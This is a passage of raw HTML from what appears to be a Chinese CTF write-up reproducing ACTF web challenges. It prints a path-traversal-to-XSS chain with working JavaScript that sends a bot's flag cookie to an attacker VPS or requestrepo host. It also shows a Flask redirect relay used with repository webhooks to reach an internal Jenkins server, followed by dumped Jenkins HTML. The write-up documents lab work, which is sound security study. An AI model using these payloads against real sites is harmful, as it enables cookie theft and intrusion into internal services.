class="keyword">let</span> &#123; code &#125; = req.<span class="property">body</span></span><br><span class="line">    <span class="keyword">let</span> vip_url = <span class="variable constant_">VIP_URL</span></span><br><span class="line">    <span class="keyword">let</span> data = <span class="keyword">await</span> (<span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(username, vip_url), &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">            <span class="title class_">Cookie</span>: <span class="title class_">Object</span>.<span class="title function_">entries</span>(req.<span class="property">cookies</span>).<span class="title function_">map</span>(<span class="function">(<span class="params">[k, v]</span>) =&gt;</span> <span class="string">`<span class="subst">$&#123;k&#125;</span>=<span class="subst">$&#123;v&#125;</span>`</span>).<span class="title function_">join</span>(<span class="string">&#x27;; &#x27;</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123; code &#125;)</span><br><span class="line">    &#125;)).<span class="title function_">text</span>()</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;ok&#x27;</span> == data) &#123;</span><br><span class="line">        res.<span class="title function_">cookie</span>(<span class="string">&#x27;token&#x27;</span>, <span class="title function_">sign</span>(&#123; username, <span class="attr">isVip</span>: <span class="literal">true</span> &#125;))</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Congratulation! You are VIP now.&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(data)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>而这个 visit, 打开浏览器访问，🍪里面是携带着 flag, 所以👴要拿到这个🍪.</p><p>但是 flag 不一定能够传来，而 vip 路由能够强制让 Cookie 携带就很好✌</p><p>不过直接访问是拿不到的，怎么办捏，xss 过来！</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/share路由<span class="keyword">new</span> url访问-&gt;<span class="regexp">/preview路由进行new url xss-&gt;加载vps恶意js-&gt;以带🍪的身份访问/</span>login和/vip,触发vip的fetch访问-&gt;将🍪数据转到xss平台.</span><br></pre></td></tr></table></figure><p>使用 urlencode</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/share/%2e%2e%2f%<span class="number">70</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">76</span>%<span class="number">69</span>%<span class="number">65</span>%<span class="number">77</span>%3f%<span class="number">74</span>%<span class="number">65</span>%<span class="number">78</span>%3d%<span class="number">61</span>%<span class="number">77</span>%<span class="number">64</span>%<span class="number">61</span>%<span class="number">64</span>%<span class="number">61</span>%<span class="number">77</span>%<span class="number">64</span>%<span class="number">26</span>%<span class="number">74</span>%<span class="number">68</span>%<span class="number">65</span>%6d%<span class="number">65</span>%3d%2f%2f%<span class="number">34</span>%<span class="number">33</span>%2e%<span class="number">31</span>%<span class="number">34</span>%<span class="number">33</span>%2e%<span class="number">31</span>%<span class="number">39</span>%<span class="number">32</span>%2e%<span class="number">31</span>%<span class="number">39</span>%3a%<span class="number">31</span>%<span class="number">31</span>%<span class="number">34</span>%<span class="number">35</span></span><br><span class="line">/share/../preview?tex=awdadawd&amp;theme=<span class="comment">//43.143.192.19:1145</span></span><br></pre></td></tr></table></figure><p>目录穿越大法访问 preview, 至于为啥用 url 编码，因为是接在路径之后的，容易被解析成路径而不是传递的参数.</p><p>js 上放丶东西</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> login = <span class="string">&#x27;/login&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> vip = <span class="string">&#x27;/vip&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> loginreq = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;</span><br><span class="line">    <span class="attr">username</span>: <span class="string">&#x27;//z08vedyv.requestrepo.com&#x27;</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&#x27;7bbf4ac9596b5662b44db993bd8050dd&#x27;</span>,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> changshu = &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>: loginreq,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">evil</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> loginrep = <span class="keyword">await</span> <span class="title function_">fetch</span>(login, changshu);</span><br><span class="line">        <span class="keyword">if</span> (loginrep.<span class="property">ok</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> vipResponse = <span class="keyword">await</span> <span class="title function_">fetch</span>(vip, &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                <span class="attr">headers</span>: &#123;</span><br><span class="line">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123; <span class="attr">code</span>: <span class="string">&quot;awdawdwadwadwadwa&quot;</span> &#125;),</span><br><span class="line">                <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="comment">// 在这里你可以处理vipResponse</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 在这里处理登录失败的情况</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">evil</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>👴爱使用<a href="https://www.requestrepo.com/"> Dashboard - requestrepo.com</a> 收 cookies</p><p>cnm 不好用，还是 vps 得劲</p><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231030181708.png" alt="微信截图_20231030181708"></p><p>eeeeeeeeeeeeeeez, もろいもろい。</p><p>最後の exp 改</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> login = <span class="string">&#x27;/login&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> vip = <span class="string">&#x27;/vip&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> loginreq = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;</span><br><span class="line">    <span class="attr">username</span>: <span class="string">&#x27;//43.143.192.19:7777&#x27;</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&#x27;9aaf577e773320b3548fdc5f37aa6e74&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> changshu = &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>: loginreq,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">evil</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> loginrep = <span class="keyword">await</span> <span class="title function_">fetch</span>(login, changshu);</span><br><span class="line">        <span class="keyword">if</span> (loginrep.<span class="property">ok</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> vipResponse = <span class="keyword">await</span> <span class="title function_">fetch</span>(vip, &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                <span class="attr">headers</span>: &#123;</span><br><span class="line">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123; <span class="attr">code</span>: <span class="string">&quot;awdawdwadwadwadwa&quot;</span> &#125;),</span><br><span class="line">                <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="comment">// 在这里你可以处理vipResponse</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 在这里处理登录失败的情况</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">evil</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>现在，👴就是新世界の卡密.</p><h1 id="hooks"><span id="hooks"> hooks</span></h1><p><a href="https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/">https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/</a></p><h2 id="what-is-webhook"><span id="what-is-webhook"> what is webhook🤔</span></h2><p>Webhook 是一种通过 HTTP 协议实现的回调机制，用于将实时事件和数据从一个应用程序传递到另一个应用程序。Webhook 允许应用程序在特定事件发生时自动通知其他应用程序，这种通知是通过 HTTP POST 请求进行的。它是一种用于实现实时通信和数据传递的轻量级机制。</p><p>以下是 Webhook 的主要特点和用途：</p><p>事件驱动通知： Webhook 主要用于事件驱动的通知，例如新的订单、新的消息、状态更改等。当特定事件发生时，源应用程序将发送 HTTP POST 请求到目标应用程序的 Webhook URL，通知目标应用程序进行响应。</p><p>实时性： Webhook 通常具有低延迟，因为它们是即时触发的。当事件发生时，通知立即发送，而不需要轮询或定期检查。</p><p>自动化： Webhook 允许自动化处理事件和数据，减少了手动干预的需要。这对于集成不同应用程序、自动化工作流程和提高效率非常有用。</p><p>扩展性： Webhook 可以与各种不同类型的应用程序和服务集成，使其具有很高的灵活性和扩展性。</p><p>数据传递： Webhook 可以传递各种数据格式，包括 JSON、XML、表单数据等，这使得它们适用于多种应用场景。</p><p>重点🤪:webhook 只允许我们发送 POST 请求，没法控制请求的 body, 甚至没有 csrf 的 token😓</p><h2 id="abusing-jenkins-login"><span id="abusing-jenkins-login"> Abusing Jenkins login</span></h2><p>不说人话:</p><p>Jenkins 是一个开源的自动化服务器，用于构建、测试和部署软件项目。它提供了一个灵活的平台，使团队能够自动化整个软件开发过程中的各种任务。以下是 Jenkins 的主要特点和用途：</p><p>持续集成 (CI) 和持续交付 (CD)： Jenkins 通过自动化构建和测试过程，支持持续集成和持续交付，使团队能够频繁地、可靠地交付软件。</p><p>插件生态系统： Jenkins 具有强大的插件生态系统，允许用户轻松地扩展其功能。有数千个可用的插件，用于与各种工具和技术进行集成。</p><p>分布式构建： Jenkins 支持分布式构建，可以将构建任务分发到多个构建代理 (Nodes)，以提高构建性能和可扩展性。</p><p>自动化部署： Jenkins 可以与各种部署工具和云平台集成，支持自动化部署到不同环境，包括开发、测试和生产环境。</p><p>可视化界面： Jenkins 提供直观的 Web 用户界面，用于管理构建任务、查看构建历史和生成报告。</p><p>多种构建工具支持： Jenkins 可以与各种构建工具集成，包括 Apache Ant、Maven、Gradle 等。</p><p>多语言支持： Jenkins 支持多种编程语言和技术栈，使其适用于各种项目。</p><p>安全性和权限控制： Jenkins 具有强大的安全性和权限控制功能，可以管理用户和角色的访问权限。</p><p>日志记录和报告： Jenkins 生成详细的构建日志和报告，以便诊断问题和追踪构建进度。</p><p>活跃的社区和支持： Jenkins 是一个开源项目，有一个活跃的社区，提供支持、文档和插件。</p><p>说人话:👴也不知道</p><p>一种绕过它们的方法，从登录页面开始。我们可以尝试暴力破解用户凭据，因为 Jenkins 用户在其自己的用户数据库中进行管理，或者使用其他缺乏基本保护（例如密码策略或针对自动化的保护）的用户管理方法，这是很常见的。(机翻，👴看不懂🐏文)</p><p>总而言之就是，通过 github 或 gitlab 的 webhooks 经过 python 中转，打到题目的内网.</p><p>👴真 tm 是个 sb, 看个文章没看全，把一部分 exp 拿去打，死活打不通，后来问⛰🌊giegie, 才知道要通过 python 写个重定向中转才能有回显，说是有视频演示，👴tm🐇了，没这么 sb 吧，阿米诺斯.</p><h2 id="开打"><span id="开打"> 开打😤</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/evil&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">evil</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;http://124.70.33.170:8088/redirect?redirect_url=http://jenkins:8080/&quot;</span>,code=<span class="number">302</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">7777</span>)</span><br></pre></td></tr></table></figure><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231031084325.png" alt="微信截图_20231031084325"></p><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231031081144.png" alt="微信截图_20231031081144"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head resURL=<span class="string">&quot;/static/e1c81722&quot;</span> data-rooturl=<span class="string">&quot;&quot;</span> data-resurl=<span class="string">&quot;/static/e1c81722&quot;</span>&gt;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    &lt;title&gt;Dashboard [Jenkins]&lt;/title&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/static/e1c81722/css/layout-common.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/static/e1c81722/css/style.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/static/e1c81722/css/color.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/static/e1c81722/css/responsive-grid.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;shortcut icon&quot;</span> href=<span class="string">&quot;/static/e1c81722/favicon.ico&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;image/vnd.microsoft.icon&quot;</span> /&gt;&lt;link color=<span class="string">&quot;black&quot;</span> rel=<span class="string">&quot;mask-icon&quot;</span> href=<span class="string">&quot;/images/mask-icon.svg&quot;</span> /&gt;&lt;script&gt;var isRunAsTest=false; var rootURL=<span class="string">&quot;&quot;</span>; var resURL=<span class="string">&quot;/static/e1c81722&quot;</span>;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/prototype.js&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/behavior.js&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&#x27;/adjuncts/e1c81722/org/kohsuke/stapler/bind.js&#x27;</span> <span class="built_in">type</span>=<span class="string">&#x27;text/javascript&#x27;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/yahoo/yahoo-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/dom/dom-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/event/event-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/animation/animation-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/dragdrop/dragdrop-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/container/container-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/connection/connection-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/datasource/datasource-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/autocomplete/autocomplete-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/menu/menu-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/element/element-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/button/button-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/storage/storage-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/hudson-behavior.js&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/sortable.js&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;&lt;script&gt;crumb.init(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);&lt;/script&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/static/e1c81722/scripts/yui/container/assets/container.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/static/e1c81722/scripts/yui/assets/skins/sam/skin.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/static/e1c81722/scripts/yui/container/assets/skins/sam/container.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/static/e1c81722/scripts/yui/button/assets/skins/sam/button.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/static/e1c81722/scripts/yui/menu/assets/skins/sam/menu.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;search&quot;</span> href=<span class="string">&quot;/opensearch.xml&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;application/opensearchdescription+xml&quot;</span> title=<span class="string">&quot;Jenkins&quot;</span> /&gt;&lt;meta name=<span class="string">&quot;ROBOTS&quot;</span> content=<span class="string">&quot;INDEX,NOFOLLOW&quot;</span> /&gt;&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;alternate&quot;</span> href=<span class="string">&quot;/rssAll&quot;</span> title=<span class="string">&quot;Jenkins:all (all builds)&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;application/rss+xml&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;alternate&quot;</span> href=<span class="string">&quot;/rssAll?flavor=rss20&quot;</span> title=<span class="string">&quot;Jenkins:all (all builds) (RSS 2.0)&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;application/rss+xml&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;alternate&quot;</span> href=<span class="string">&quot;/rssFailed&quot;</span> title=<span class="string">&quot;Jenkins:all (failed builds)&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;application/rss+xml&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;alternate&quot;</span> href=<span class="string">&quot;/rssFailed?flavor=rss20&quot;</span> title=<span class="string">&quot;Jenkins:all (failed builds) (RSS 2.0)&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;application/rss+xml&quot;</span> /&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/cookie/cookie-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script&gt;</span><br><span class="line">              YAHOO.util.Cookie.<span class="built_in">set</span>(<span class="string">&quot;screenResolution&quot;</span>, screen.width+<span class="string">&quot;x&quot;</span>+screen.height);</span><br><span class="line">            &lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/jsbundles/page-init.js&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;&lt;/head&gt;&lt;body data-model-<span class="built_in">type</span>=<span class="string">&quot;hudson.model.AllView&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;jenkins&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;yui-skin-sam two-column jenkins-2.138&quot;</span> data-version=<span class="string">&quot;2.138&quot;</span>&gt;&lt;a href=<span class="string">&quot;#skip2content&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;skiplink&quot;</span>&gt;Skip to content&lt;/a&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;page-head&quot;</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;header&quot;</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;logo&quot;</span>&gt;&lt;a <span class="built_in">id</span>=<span class="string">&quot;jenkins-home-link&quot;</span> href=<span class="string">&quot;/&quot;</span>&gt;&lt;img src=<span class="string">&quot;/static/e1c81722/images/headshot.png&quot;</span> alt=<span class="string">&quot;[Jenkins]&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;jenkins-head-icon&quot;</span> /&gt;&lt;img src=<span class="string">&quot;/static/e1c81722/images/title.png&quot;</span> alt=<span class="string">&quot;Jenkins&quot;</span> width=<span class="string">&quot;139&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;jenkins-name-icon&quot;</span> height=<span class="string">&quot;34&quot;</span> /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;login&quot;</span>&gt; &lt;a href=<span class="string">&quot;/login?from=%2F&quot;</span>&gt;&lt;b&gt;log <span class="keyword">in</span>&lt;/b&gt;&lt;/a&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;searchbox hidden-xs&quot;</span>&gt;&lt;form method=<span class="string">&quot;get&quot;</span> name=<span class="string">&quot;search&quot;</span> action=<span class="string">&quot;/search/&quot;</span> style=<span class="string">&quot;position:relative;&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;no-json&quot;</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;search-box-minWidth&quot;</span>&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;search-box-sizer&quot;</span>&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;searchform&quot;</span>&gt;&lt;<span class="built_in">input</span> name=<span class="string">&quot;q&quot;</span> placeholder=<span class="string">&quot;search&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;search-box&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;has-default-text&quot;</span> /&gt; &lt;a href=<span class="string">&quot;https://jenkins.io/redirect/search-box&quot;</span>&gt;&lt;img src=<span class="string">&quot;/static/e1c81722/images/16x16/help.png&quot;</span> style=<span class="string">&quot;width: 16px; height: 16px; &quot;</span> <span class="keyword">class</span>=<span class="string">&quot;icon-help icon-sm&quot;</span> /&gt;&lt;/a&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;search-box-completion&quot;</span>&gt;&lt;/div&gt;&lt;script&gt;createSearchBox(<span class="string">&quot;/search/&quot;</span>);&lt;/script&gt;&lt;/div&gt;&lt;/form&gt;&lt;/div&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;breadcrumbBar&quot;</span>&gt;&lt;tr <span class="built_in">id</span>=<span class="string">&quot;top-nav&quot;</span>&gt;&lt;td <span class="built_in">id</span>=<span class="string">&quot;left-top-nav&quot;</span> colspan=<span class="string">&quot;2&quot;</span>&gt;&lt;link rel=<span class="string">&#x27;stylesheet&#x27;</span> href=<span class="string">&#x27;/adjuncts/e1c81722/lib/layout/breadcrumbs.css&#x27;</span> <span class="built_in">type</span>=<span class="string">&#x27;text/css&#x27;</span> /&gt;&lt;script src=<span class="string">&#x27;/adjuncts/e1c81722/lib/layout/breadcrumbs.js&#x27;</span> <span class="built_in">type</span>=<span class="string">&#x27;text/javascript&#x27;</span>&gt;&lt;/script&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;top-sticker noedge&quot;</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;top-sticker-inner&quot;</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;right-top-nav&quot;</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;right-top-nav&quot;</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;smallfont&quot;</span>&gt;&lt;a href=<span class="string">&quot;?auto_refresh=true&quot;</span>&gt;ENABLE AUTO REFRESH&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;ul <span class="built_in">id</span>=<span class="string">&quot;breadcrumbs&quot;</span>&gt;&lt;li <span class="keyword">class</span>=<span class="string">&quot;item&quot;</span>&gt;&lt;a href=<span class="string">&quot;/&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;model-link inside&quot;</span>&gt;Jenkins&lt;/a&gt;&lt;/li&gt;&lt;li href=<span class="string">&quot;/&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;children&quot;</span>&gt;&lt;/li&gt;&lt;/ul&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;breadcrumb-menu-target&quot;</span>&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/div&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span 